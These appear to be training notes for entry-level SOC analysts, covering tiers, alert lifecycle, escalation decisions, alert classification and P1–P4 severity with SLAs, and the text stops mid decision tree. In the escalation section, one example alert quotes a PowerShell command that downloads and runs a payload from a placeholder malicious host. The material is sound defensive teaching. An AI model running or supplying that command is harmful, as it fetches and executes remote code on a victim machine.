# 1: Understanding L1 vs L2 vs L3 Responsibilities

## SOC (Security Operations Center)
A SOC is a centralized team that monitors, detects, analyses, and responds to cybersecurity threats 24/7.

Think of it like a security control room for an organization's IT infrastructure.

## SOC Analyst Tiers 

**Most SOCs follow a tier model:**
- L1 → Monitoring & Triage
- L2 → Investigation & Containment
- L3 → Threat Hunting & Advanced Analysis

#### SOC L1 Analyst (Tier 1) - "The First Responder"
**Key Responsibilities:**
✅ Monitor security alerts from SIEM, EDR, IDS/IPS, firewalls
✅ Initial triage – Is this alert real or false?
✅ Basic investigation – Check logs, user activity, IP reputation
✅ Categorize and prioritize alerts (High/Medium/Low)
✅ Escalate complex issues to L2
✅ Document findings in ticketing system
✅ Follow playbooks/SOPs (Standard Operating Procedures)

**Example Tasks:**
- An antivirus alert fires → Check if it's a known false positive
- User locked out → Check for brute force attempts
- Suspicious login from foreign country → Verify with user/manager

**Skills Needed:**
- Basic understanding of networks, operating systems
- Familiarity with security tools (SIEM basics)
- Good communication (you'll escalate a lot!)
- Attention to detail


#### SOC L2 Analyst (Tier 2) - "The Investigator"

**Key Responsibilities:**
✅ Deep-dive investigations – Analyze escalated incidents from L1
✅ Correlation analysis – Connect multiple alerts to find attack patterns
✅ Threat hunting – Proactively search for hidden threats
✅ Recommend remediation – Block IPs, isolate hosts, reset passwords
✅ Tune SIEM rules – Reduce false positives
✅ Mentor L1 analysts

**Example Tasks:**
L1 escalates suspicious PowerShell execution → You analyze process tree, parent-child relationships
Multiple failed logins + unusual network traffic → You identify a credential stuffing attack


#### SOC L3 Analyst / Incident Responder (Tier 3) - "The Expert"
Advanced role (3+ years experience)

Key Responsibilities:
✅ Handle critical incidents (ransomware, data breaches)
✅ Malware analysis (reverse engineering)
✅ Forensic investigation – Preserve evidence, root cause analysis
✅ Develop detection rules and playbooks
✅ Threat intelligence integration
✅ Coordinate with management and external teams (legal, law enforcement)


| Aspect | L1 | L2 | L3 |
| :--- | :--- | :--- | :--- |
| **Focus** | Monitoring & Triage | Investigation & Analysis | Incident Response & Forensics |
| **Alert Handling** | First look, quick checks | Deep analysis | Critical incidents only |
| **Decision Making** | Follow playbooks | Some autonomy | Full authority |
| **Escalation** | Escalates to L2 | Escalates to L3 | Final decision maker |
| **Experience** | 0-1 year | 1-3 years | 3+ years |

### Example
**Scenario:** You receive an alert:
"Antivirus detected: Trojan.Generic.12345 on LAPTOP-HR-05"

As L1, what would you do?
- Check if file is quarantined
- Look up file hash on VirusTotal
- Check user's recent activity (any suspicious downloads?)
- Verify with user if they downloaded anything unusual
- If confirmed malicious → Escalate to L2 + isolate machine
- If false positive → Document and close ticket


____


# 2: Alert Lifecycle (Alert → Triage → Investigate → Action → Document → Close)

## Alert Lifecycle
The alert lifecycle is the step-by-step process a SOC analyst follows from the moment an alert fires until it's resolved.

Think of it as a workflow/checklist that ensures no alert is missed and every incident is handled properly.

### The 6 Stages of Alert Lifecycle
```
📍 ALERT → 🔍 TRIAGE → 🕵️ INVESTIGATE → ⚡ ACTION → 📝 DOCUMENT → ✅ CLOSE
```

#### Stage 1: ALERT (Detection)
- A security tool (SIEM, EDR, Firewall, IDS/IPS) detects suspicious activity
- Alert appears in your dashboard/queue

- Example Alerts:
- "Multiple failed login attempts detected"
- "Malware detected: LAPTOP-FIN-12"
- "Outbound connection to known malicious IP"
- "Privilege escalation attempt on server"

**Your first action:**
✅ Acknowledge the alert (so other analysts know you're handling it)

#### Stage 2: TRIAGE (Initial Assessment)
Quickly determine if the alert is real and how urgent it is.

**Key Questions to Ask:**
❓ Is this a True Positive or False Positive?
❓ What is the severity? (Critical/High/Medium/Low)
❓ Is this a known issue (e.g., recurring false positive)?
❓ Is the affected system critical? (e.g., domain controller, database server)

**Quick Checks:**
✅ Check recent tickets – Has this happened before?
✅ Check whitelists/blacklists – Is the IP/domain known?
✅ Check user context – Is the user traveling? Working odd hours?
✅ Check asset criticality – Server vs employee laptop?

**Example Triage:**

| Alert | Quick Check | Decision |
| :--- | :--- | :--- |
| "Antivirus blocked file" | File already quarantined, no execution | Low priority, monitor |
| "Failed logins from China" | User is in US, never travels | **HIGH PRIORITY** → Investigate |
| "Port scan detected" | From vulnerability scanner IP (internal tool) | False Positive → Close |

**Outcome of Triage:**
✅ Proceed to Investigation (if suspicious)
✅ Close as False Positive (if benign)
✅ Escalate immediately (if critical and beyond L1 scope)

#### Stage 3: INVESTIGATE (Deep Dive)
Gather evidence to understand what happened, when, and why.

**Investigation Checklist:**
##### A) Timeline Analysis

🕐 When did it start?
🕐 Is it still ongoing?
🕐 What happened before/after?

##### B) User/Entity Analysis

👤 Who is the user? (Check AD, HR records)
💼 What is their role? (Finance, HR = higher risk)
📞 Contact user/manager to verify activity.

##### C) Log Analysis (Most important!)

🖥️ Windows Event Logs (Login events, process creation)
🌐 Firewall logs (Incoming/outgoing connections)
🔐 Proxy logs (Websites visited)
📧 Email gateway logs (Phishing attempts?)

##### D) Threat Intelligence

🔗 Check IP/domain reputation (VirusTotal, AbuseIPDB)
🔗 Check file hash (VirusTotal, Hybrid Analysis)
🔗 Search for IOCs (Indicators of Compromise)

###### Example Investigation:
**Alert:** "Suspicious PowerShell execution on LAPTOP-HR-08"

**Investigation Steps:**

1. Check what PowerShell command was run.
```
powershell.exe -enc <base64_encoded_command>
```

(Encoded commands = red flag! 🚩)

2. Decode the command (use CyberChef)

- If it downloads malware → True Positive
- If it's a legitimate admin script → Check with IT team

3. Check process tree (parent-child processes)

- Was it launched by winword.exe (Word)? → Likely macro malware
- Was it launched by explorer.exe? → User clicked something

4. Check network connections (Did it connect to external IP?)

5. Check user activity (Any other suspicious actions?)

**Outcome:**

✅ Confirmed malicious → Move to Action
✅ Confirmed benign → Move to Document & Close
✅ Need expert help → Escalate to L2


#### Stage 4: ACTION (Containment & Remediation)
**Goal:** Stop the threat and prevent damage.

#### Common Actions (L1 Level):

| Threat Type | Action |
| :--- | :--- |
| Malware detected | Isolate machine from network, run full scan |
| Compromised account | Disable account, force password reset |
| Malicious IP connection | Block IP at firewall, check other systems |
| Phishing email | Delete email from all inboxes, block sender |
| Insider threat | Escalate to L2 + notify management |

**Important Notes:**
- ⚠️ Always follow your playbook – Don't improvise on critical systems
- ⚠️ Get approval for major actions – Blocking a server can disrupt business
- ⚠️ Preserve evidence – Don't delete logs/files (needed for forensics)

**Example Action:**
- Scenario: Confirmed ransomware on LAPTOP-FIN-12
- **Your action:**
	1. Immeiately isolate the laptop (disconnect network)
	2. Notify L2/Incident Response team
	3. Check backups (with IT team)
	4. Scan network for lateral movement



#### Stage 5: 📝 DOCUMENT (Record Everything)
**Goal:** Create a clear record for future reference and compliance.

**What to Document:**
✅ Alert Details
Alert name, timestamp, source system

✅ Investigation Summary
What you checked, what you found

✅ Evidence
Screenshots, log excerpts, file hashes, IPs

✅ Actions Taken
What you did to contain/remediate

✅ Outcome
True Positive / False Positive
Resolved / Escalated

**Example Ticket Documentation:**
```
TICKET #12345: Malware Detection - LAPTOP-HR-08

SUMMARY:
Antivirus detected Trojan.Generic on LAPTOP-HR-08 at 14:35 UTC.

INVESTIGATION:
- File: invoice.exe (downloaded from suspicious email)
- Hash: 5d41402abc4b2a76b9719d911017c592
- VirusTotal: 45/70 vendors flagged as malicious
- User confirmed clicking email attachment

ACTIONS TAKEN:
- Isolated machine from network
- Ran full antivirus scan (3 additional files quarantined)
- Reset user password
- Blocked sender domain at email gateway

OUTCOME:
TRUE POSITIVE - Malware removed, system cleaned.

STATUS: CLOSED
```


#### Stage 6: ✅ CLOSE (Resolution)
**Goal:** Officially close the ticket after confirming the issue is resolved.

**Before Closing, Verify:**
- ✅ Threat is fully contained/removed
- ✅ System is back to normal operation
- ✅ User notified (if applicable)
- ✅ Documentation is complete
- ✅ Follow-up actions assigned (if any)

**Closure Categories:**
- ✅ True Positive - Resolved
- ✅ False Positive - No Action Needed
- ✅ Escalated to L2/L3
- ✅ Pending (waiting for user/IT team)


### Complete example
#### Alert:
"User 'jdoe' logged in from Russia (unusual location)"

#### Triage:
User is based in New York, never traveled to Russia → Suspicious!

#### Investigate:
- Check login times: 3 AM EST (user unlikely to be working)
- Check login method: VPN (company doesn't have Russia office)
- Contact user: "I didn't log in!"

#### Action:
- Disable account immediately
- Force password reset
- Check email for forwarding rules (attacker may have set up)
- Block Russia IP at firewall

#### Document:
```
TRUE POSITIVE: Account compromise
Attacker accessed via stolen credentials
Actions: Account disabled, password reset, IP blocked
User re-enabled after security training
```

**Close:**
Status: Resolved

# 3: When to Escalate vs When to Close

**As an L1 analyst, one of your most critical skills is knowing:**

✅ When you can handle and close an alert yourself
✅ When you need to escalate to L2/L3

**Making the wrong decision can:**
❌ Delay incident response (if you don't escalate when needed)
❌ Waste L2's time (if you escalate unnecessarily)
❌ Miss a real threat (if you close a True Positive as False Positive)

####  Decision Framework: Close vs Escalate
```

```


##  WHEN TO CLOSE an Alert (You Can Handle It)
#### Scenario 1: Confirmed False Positive
**Definition:** The alert fired, but there's no actual threat.

**Examples:**

| Alert | Why It's False Positive | Action |
| :--- | :--- | :--- |
| Port scan detected from 192.168.1.50 | Internal vulnerability scanner (scheduled scan) | Close - Add to whitelist |
| User accessed "hacking tools website" | Security researcher visiting VirusTotal | Close - Document legitimate use |
| Antivirus alert on server | Known false positive (check AV vendor database) | Close - Submit exclusion request |
| Failed login attempts | User forgot password, locked themselves out | Close - Reset password |

**How to Verify It's False Positive:**
- ✅ Check known false positive list (your SOC should maintain one)
- ✅ Cross-reference with whitelisted IPs/domains
- ✅ Verify with user/IT team
- ✅ Check vendor documentation (for tool-related alerts)


####  Scenario 2: Low-Severity, Resolved Issue
**You can close if:**
- ✅ Threat was automatically contained (e.g., email blocked, file quarantined)
- ✅ No evidence of compromise or lateral movement
- ✅ Standard remediation successfully applied

**Examples:**

| Alert | Investigation Result | Action |
| :--- | :--- | :--- |
| Malicious email received | Email blocked by gateway, never reached inbox | Close - No user interaction |
| Malware download blocked | EDR prevented execution, file quarantined | Close - Monitor user for 24hrs |
| User visited phishing site | User didn't enter credentials (checked with user) | Close - Send security awareness reminder |
| Brute force on disabled account | Account already disabled, no access granted | Close - Document attempt |

#### Scenario 3: Informational Alerts (No Action Needed)
Some alerts are just "FYI" – they require documentation but no action.

**Examples:**
- Software update applied successfully
- Security policy change logged
- Firewall rule modified (approved change)
- Scheduled maintenance activity

**Action:** Document and close


### WHEN TO ESCALATE

 **ALWAYS ESCALATE These Scenarios:**

#### 1. Confirmed Security Incidents ==(True Positives)==

| Incident Type | Why Escalate | Example |
| :--- | :--- | :--- |
| Malware Execution | Needs forensic analysis, may have spread | Ransomware, trojan executed on system |
| Account Compromise | Needs credential reset across systems, check for data exfiltration | Attacker logged in with stolen credentials |
| Data Breach | Legal/compliance implications, requires incident response team | Sensitive data sent to external email |
| Command & Control (C2) | Active attacker connection, needs immediate containment | System communicating with C2 server |
| Lateral Movement | Attack spreading across network | Attacker moved from workstation to server |
| Privilege Escalation | Attacker gained admin rights | Standard user suddenly has domain admin privileges |

#### 2. Attacks on Critical Assets

**If the affected system is critical, escalate immediately:**

| Critical Asset             | Why Critical                                | Escalation Priority |
| :------------------------- | :------------------------------------------ | :------------------ |
| Domain Controller          | Controls entire network authentication      | 🔴 CRITICAL         |
| Database Server            | Contains sensitive customer/financial data  | 🔴 CRITICAL         |
| Email Server               | Communication backbone, potential data leak | 🔴 HIGH             |
| Web Server (public-facing) | Brand reputation, customer trust            | 🔴 HIGH             |
| CEO/CFO/Executive laptop   | High-value target, sensitive information    | 🔴 HIGH             |

Even a "minor" alert on a critical asset = ESCALATE


#### 3. You're Unsure or Out of Your Depth
It's ALWAYS better to escalate if:

- ❓ You don't understand what's happening
- ❓ The alert involves tools/systems you're unfamiliar with
- ❓ Investigation reveals unusual patterns you can't explain
- ❓ The playbook doesn't cover this scenario
- ❓ You've spent >30 minutes and still can't determine True/False Positive

```
Alert: "Unusual PowerShell command executed"
Command: 
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')

Your thought: "I know PowerShell can be dangerous, but I'm not sure 
              if this specific command is malicious..."

✅ CORRECT ACTION: ESCALATE to L2
(Don't guess - this is obfuscated malware download)
```


#### 4. Multiple Related Alerts (Possible Attack Chain)

If you see a pattern of alerts from the same user/system:

**Example Attack Chain:**
```
10:15 - Phishing email received by user
10:17 - User clicked link in email
10:20 - Malware downloaded
10:22 - Malware executed
10:25 - Outbound connection to suspicious IP
10:30 - Unusual file encryption activity
```

Escalate immediately – L2 needs to see the full picture

#### 5. Incidents Involving Legal/Compliance Issues
Escalate if the incident involves:

- 🔒 Data breaches (PII, PHI, PCI data exposed)
- 🔒 Regulatory violations (GDPR, HIPAA, SOX)
- 🔒 Insider threats (employee stealing data)
- 🔒 Law enforcement involvement (hacking, fraud, terrorism-related)

These require management and legal team involvement


____


# 4: True Positive / False Positive / False Negative
**As an L1 analyst, your primary job is to classify alerts correctly:**

- ✅ Is this a real threat (True Positive)?
- ✅ Is this a false alarm (False Positive)?
- ✅ Did we miss a threat (False Negative)?


#### The Four Alert Classifications
```
                    ACTUAL THREAT EXISTS?
                    YES         |    NO
                    ____________|____________
         YES    |               |
ALERT    TRUE POSITIVE | FALSE POSITIVE
FIRED?          ✅     |      ❌
         ______|_______|____________
         NO    |       |
         FALSE NEGATIVE| TRUE NEGATIVE
                ⚠️     |      ✅
```

## 1) TRUE POSITIVE (TP)
An alert fired AND there is a real security threat.

**In simple terms:** The alert is correct – there's actually something bad happening!

**Examples:**



**How to Confirm True Positive:**
- ✅ Evidence of malicious activity (not just suspicious)
- ✅ Indicators of Compromise (IOCs) match known threats
- ✅ Behavioral analysis confirms attack pattern
- ✅ Impact is visible (files encrypted, data stolen, system compromised)

**Your Action on True Positive:**
Immediate Actions:
- ⚡ Contain the threat (isolate system, disable account)
- ⚡ Escalate to L2 (if beyond your scope)
- ⚡ Notify stakeholders (management, user's manager)
- ⚡ Document thoroughly (this is a real incident!)

## 2) FALSE POSITIVE (FP)
An alert fired BUT there is NO actual threat.

**In simple terms:** The security tool made a mistake – it's a false alarm!

**Examples of False Positives:**

| Alert | Investigation | Why It's FP |
| :--- | :--- | :--- |
| "Port scan detected from 10.10.1.50" | Internal vulnerability scanner (authorized tool) | Legitimate activity ❌ |
| "Malware detected: hacktools.exe" | Penetration testing tool used by security team | Authorized security tool ❌ |
| "User accessed hacking website" | IT admin visited vendor documentation site | Misclassified URL ❌ |
| "Unusual login time detected" | User working night shift (approved overtime) | Normal business activity ❌ |
| "Suspicious PowerShell execution" | IT automation script (scheduled task) | Legitimate admin work ❌ |

#### Common Causes of False Positives:
1. **Overly Sensitive Rules**
```
Rule: "Alert on ANY PowerShell execution"
Problem: PowerShell is used legitimately by admins daily
Result: 500 FP alerts per day 😫
```

2. Lack of Context
```
Alert: "File downloaded from file-sharing site"
Missing context: User is in Marketing, downloading campaign assets
Result: False Positive   
```

3. Outdated Threat Intelligence
```
Alert: "Connection to malicious IP 8.8.8.8"
Reality: This is Google DNS (was incorrectly listed years ago)
Result: False Positive
```

**How to Confirm False Positive:**
- ✅ No malicious intent found
- ✅ Activity is authorized/legitimate
- ✅ Matches known FP patterns (in your FP database)
- ✅ User/IT confirms legitimate business need
- ✅ No IOCs match real threats

**Your Action on False Positive:**
Immediate Actions:
- ✅ Document why it's FP (for future reference)
- ✅ Add to whitelist (if recurring)
- ✅ Tune the rule (request SIEM team to adjust)
- ✅ Close the ticket


## FALSE NEGATIVE (FN)
NO alert fired but a real threat exists.

In simple terms: The security tool MISSED an actual attack! (This is the most dangerous!)

**Examples of False Negatives:**

| Real Threat | Why Alert Didn't Fire | Impact |
| :--- | :--- | :--- |
| Attacker used zero-day exploit | Signature not in antivirus database | System compromised 🔴 |
| Insider slowly exfiltrated data | Stayed below detection threshold | Data breach 🔴 |
| Fileless malware (lives in memory) | Antivirus only scans files on disk | Persistent backdoor 🔴 |
| Encrypted C2 traffic | Firewall couldn't inspect SSL traffic | Ongoing data theft 🔴 |
| Attacker used whitelisted tools | Abused legitimate Windows tools (LOLBins) | No detection 🔴 |
#### Why False Negatives Happen:
1. Evasion Techniques
```
Attacker uses obfuscation:
- Encoded commands
- Encryption
- Polymorphic malware (changes signature)

Your tools: Can't detect what they don't recognize   
```

2. Detection Gaps
```
Scenario: No EDR on Linux servers
Result: Malware on Linux server goes undetected
```

3. Misconfigured Rules
```
SIEM Rule: "Alert if >1000 failed logins in 1 hour"
Attacker: Does 999 failed logins per hour
Result: No alert fired
```

4. Zero-Day Exploits
```
Brand new vulnerability, no signatures exist yet
Result: No detection until it's too late
```

**How Do You Discover False Negatives?**

Since no alert fired, you usually find FNs through:
- ✅ Threat Hunting – Proactively searching for threats
- ✅ User Reports – "My computer is acting weird..."
- ✅ Incident Investigation – Finding related compromises
- ✅ Forensic Analysis – Post-breach investigation
- ✅ Threat Intel – "This malware was active in our environment but we didn't detect it"


## 4) TRUE NEGATIVE (TN)
NO alert fired and there is NO threat.

In simple terms: Everything is working correctly – normal business activity!

#### Examples:
- User logs in during normal work hours → No alert (correct!)
- User accesses approved work website → No alert (correct!)
- Scheduled backup runs → No alert (correct!)
- Normal network traffic → No alert (correct!)

**True Negatives are GOOD! They mean:**
- ✅ Your security tools aren't over-alerting
- ✅ Business operations run smoothly
- ✅ No unnecessary investigation needed

You'll never see True Negatives in your queue (because no alert fired), but they represent the majority of activity in your network!

# 5: Severity Levels (P1–P4) & SLA

Not all security incidents are equal! A phishing email is different from active ransomware.

**As an L1 analyst, you need to:**
- Prioritize which alerts to handle first
- Meet SLA requirements (Service Level Agreements)
- Escalate appropriately based on severity
- Communicate urgency to stakeholders


### Severity/Priority
**Severity** = How serious is the security impact?
**Priority** = How quickly must we respond?

In most SOCs, these are combined into Priority levels (P1-P4)
```
Higher Severity = Faster Response Required
```


## 4 Priority Levels
P1 - CRITICAL         🔴  Minutes to respond 
P2 - HIGH               🟠  Hours to respond
P3 - MEDIUM         🟡  Days to respond   
P4 - LOW                🟢  Weeks to respond   


### P1 - CRITICAL (Emergency)
- Immediate threat to business operations, data, or critical systems.
- Active attack in progress or imminent danger.

**Characteristics:**
- ✅ Active breach/compromise
- ✅ Critical systems affected (Domain Controller, production servers)
- ✅ Data exfiltration in progress
- ✅ Widespread impact (multiple systems/users)
- ✅ Ransomware/destructive malware
- ✅ Public-facing systems compromised

#### Examples

| Incident | Why P1? |
| :--- | :--- |
| Ransomware encrypting files | Active data destruction, business stoppage |
| Domain Controller compromised | Attacker has full network control |
| Active data breach | Customer data being exfiltrated RIGHT NOW |
| DDoS attack on public website | Business revenue impacted, reputation damage |
| Backdoor on production server | Attacker has persistent access to critical asset |
| Zero-day exploit being used | No patch available, active exploitation |
| Insider deleting critical data | Immediate data loss, potential sabotage |

L1 Action on P1 
```
🚨 IMMEDIATE ACTIONS:

1. ⚡ STOP what you're doing - this takes priority
2. ⚡ NOTIFY your supervisor/shift lead IMMEDIATELY
3. ⚡ ESCALATE to L2/Incident Response team
4. ⚡ CONTAIN if possible (isolate system, disable account)
5. ⚡ DOCUMENT timeline (every minute matters)
6. ⚡ STAY AVAILABLE (you may need to assist L2)
```




## P2 - HIGH (Urgent)
Serious security threat that requires prompt attention but is not actively causing immediate damage.

**Characteristics:**
✅ Confirmed security incident (not actively spreading)
✅ High-value target affected (Executive, sensitive system)
✅ Potential for escalation to P1
✅ Significant risk if not addressed quickly
✅ Multiple users/systems at risk

#### Examples of P2 Incidents:

| Incident | Why P2? |
| :--- | :--- |
| CEO account compromised | High-value target, but contained |
| Malware on workstation (contained) | Threat isolated, no spread detected |
| Successful phishing attack | User entered credentials, account needs securing |
| Unauthorized access attempt (blocked) | Attack prevented but shows targeting |
| Vulnerable server (critical exploit) | Not yet exploited, but high risk |
| Data leak found online | Data already exposed, damage control needed |
| Privilege escalation detected (stopped) | Attack contained but serious attempt |


**Your/L1 Actions on P2:**
```
🟠 HIGH PRIORITY ACTIONS:

1. ⚡ Acknowledge alert immediately
2. ⚡ Begin investigation within SLA
3. ⚡ Contain the threat (isolate, disable, block)
4. ⚡ Gather evidence thoroughly
5. ⚡ Escalate to L2 if beyond your scope
6. ⚡ Keep stakeholders updated (hourly updates)
```

## P3 - MEDIUM (Normal)
Security concern that requires attention but poses moderate risk. No immediate threat to operations.

**Characteristics:**
✅ Potential security issue (needs verification)
✅ Single user/system affected
✅ Limited impact to business
✅ Not actively exploited
✅ Workarounds available


#### Examples of P3 Incidents:

| Incident | Why P3? |
| :--- | :--- |
| Phishing email received (not clicked) | Potential threat, no compromise |
| Failed login attempts (no breach) | Suspicious but blocked |
| Antivirus quarantined file (no execution) | Threat contained automatically |
| Policy violation (user visited restricted site) | Security awareness issue, not breach |
| Outdated software detected | Vulnerability exists but low exploitability |
| Suspicious file uploaded to cloud | Needs investigation, no confirmed threat |
| Minor configuration issue | Security gap but low immediate risk |

**Your Actions on P3:**
```
🟡 MEDIUM PRIORITY ACTIONS:

1. ✅ Acknowledge within SLA
2. ✅ Investigate during normal workflow
3. ✅ Document findings
4. ✅ Take standard remediation steps
5. ✅ Close or escalate based on findings
6. ✅ Update ticket regularly
```

## P4 - LOW (Informational)
Minimal security concern or informational alerts. No immediate action required.

**Characteristics:**
✅ Informational only
✅ Very low risk
✅ No business impact
✅ Can be scheduled for later
✅ Documentation/compliance related

#### Examples of P4 Incidents:

| Incident | Why P4? |
| :--- | :--- |
| Security scan completed | Informational, scheduled activity |
| Firewall rule change logged | Audit trail, approved change |
| Certificate expiring in 90 days | Plenty of time to renew |
| User requested security awareness training | Proactive, not incident-related |
| False positive (recurring, known issue) | Document for tuning purposes |
| General inquiry | "How do I reset my password?" |

**Your Actions on P4:**
```
🟢 LOW PRIORITY ACTIONS:

1. ✅ Review when time permits
2. ✅ Document for records
3. ✅ Handle during low-activity periods
4. ✅ Close with minimal investigation
5. ✅ May batch process multiple P4s together
```


____

# SLA (Service Level Agreement)

**SLA** = A commitment to respond/resolve incidents within a defined timeframe.

**Think of it as a promise to your customers (internal/external):**
- "We will acknowledge your P1 incident within 15 minutes"
- "We will resolve P2 incidents within 24 hours"

**Why SLAs Matter:**
- ✅ Sets expectations – Everyone knows response times
- ✅ Ensures prioritization – Critical issues get urgent attention
- ✅ Measures performance – Are we meeting our commitments?
- ✅ Contractual obligations – Penalties for SLA violations
- ✅ Customer satisfaction – Timely response = happy stakeholders


### Typical SOC SLA Metrics:
#### 1. Time to Acknowledge (TTA)
"How quickly did we acknowledge the alert exists?"
#### 2. Time to Respond (TTR)
"How quickly did we start investigating?"
#### 3. Time to Resolve (TTRes)
"How quickly did we fully resolve the incident?"


### Priority Decision Matrix
```
Is it ACTIVELY causing damage RIGHT NOW?
├─ YES → Is it critical system/data?
│         ├─ YES → 🔴 P1
│         └─ NO → 🟠 P2
│
└─ NO → Is it a confirmed security incident?
          ├─ YES → Is it high-value target?
          │         ├─ YES → 🟠 P2
